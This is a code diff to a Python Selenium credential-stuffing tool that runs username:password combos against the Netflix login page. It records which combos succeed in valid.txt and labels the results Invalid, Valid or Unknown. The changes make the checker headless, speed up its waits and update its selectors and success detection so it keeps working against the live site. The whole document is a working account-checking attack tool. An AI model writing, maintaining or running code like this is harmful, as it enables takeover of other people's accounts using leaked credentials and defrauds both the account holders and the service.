@@ -81,9 +81,12 @@ def main():
                     browser_options = Options()
                     browser_options.add_argument(
                         'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537')
+                    browser_options.add_argument('--headless=new')
+                    browser_options.add_argument('--disable-gpu')
+                    browser_options.add_argument('--no-sandbox')
                     browser = webdriver.Chrome(options=browser_options)
                     browser.set_window_size(500, 700)
-                    wait = WebDriverWait(browser, WAIT_TIMEOUT)
+                    quick_wait = WebDriverWait(browser, 2)
                     while counter < len(user):
                         if len(user) == 0:
                             print(f"\n{YELLOW}No Accounts for current country.\n")
@@ -93,31 +96,38 @@ def main():
                                 f"{WHITE}\n\r\rConnection Status:{GREEN} OK {WHITE}| {WHITE}Combo No.{counter}:{LIGHT_YELLOW} {user[counter]}:{passw[counter].strip()} {WHITE}| Result: ", end='')
                             browser.get(page)
                             try:
-                                reject_btn = wait.until(EC.element_to_be_clickable((By.XPATH, '//button[@id="onetrust-reject-all-handler"]')))
+                                reject_btn = quick_wait.until(EC.element_to_be_clickable((By.XPATH, '//button[@id="onetrust-reject-all-handler"]')))
                                 reject_btn.click()
                             except Exception:
                                 pass
                             try:
-                                toggle_btn = wait.until(EC.presence_of_element_located((By.XPATH, '//button[@data-uia="login-toggle-button"]')))
+                                toggle_btn = quick_wait.until(EC.presence_of_element_located((By.XPATH, '//button[@data-uia="login-toggle-button"]')))
                                 if toggle_btn.text == "Use password":
                                     toggle_btn.click()
                             except Exception:
                                 pass
-                            login = wait.until(EC.presence_of_element_located((By.XPATH, '//input[@name="userLoginId"]')))
+                            login = WebDriverWait(browser, WAIT_TIMEOUT).until(EC.presence_of_element_located((By.XPATH, '//input[@name="userLoginId"]')))
                             password = browser.find_element(By.XPATH, '//input[@name="password"]')
                             login.send_keys(user[counter])
                             password.send_keys(passw[counter].strip())
                             password.send_keys(Keys.TAB)
                             password.send_keys(Keys.ENTER)
                             try:
-                                wait.until(lambda d: d.current_url != page or d.find_elements(By.XPATH, '//div[@id="loginErrorMessage"]'))
+                                WebDriverWait(browser, 15).until(
+                                    lambda d: (
+                                        any(e.is_displayed() for e in d.find_elements(By.XPATH, '//div[@data-uia="error-message-container"]'))
+                                        or d.find_elements(By.XPATH, '//div[@class="profiles-gate-container"]')
+                                        or 'login' not in d.current_url
+                                    )
+                                )
                             except Exception:
                                 pass
-                            error_msgs = browser.find_elements(By.XPATH, '//div[@id="loginErrorMessage"]')
-                            still_on_login = browser.current_url.startswith('https://www.netflix.com/login')
-                            if still_on_login and error_msgs:
+                            current_url = browser.current_url
+                            visible_errors = [e for e in browser.find_elements(By.XPATH, '//div[@data-uia="error-message-container"]') if e.is_displayed()]
+                            left_login = 'login' not in current_url
+                            if visible_errors and not left_login:
                                 print(f"{RED} Invalid Account", end='')
-                            elif not still_on_login:
+                            elif left_login:
                                 combo = "{}:{}".format(user[counter], passw[counter].strip())
                                 existing = set()
                                 if os.path.exists('valid.txt'):
@@ -130,6 +140,8 @@ def main():
                                         valid.write(combo + "\n")
                                 else:
                                     print(f"{YELLOW} Valid Account - Already Stored", end='')
+                            else:
+                                print(f"{YELLOW} Unknown Result ({current_url})", end='')
                         except Exception:
                             request = requests.get(page)
                             if request.status_code == 403:
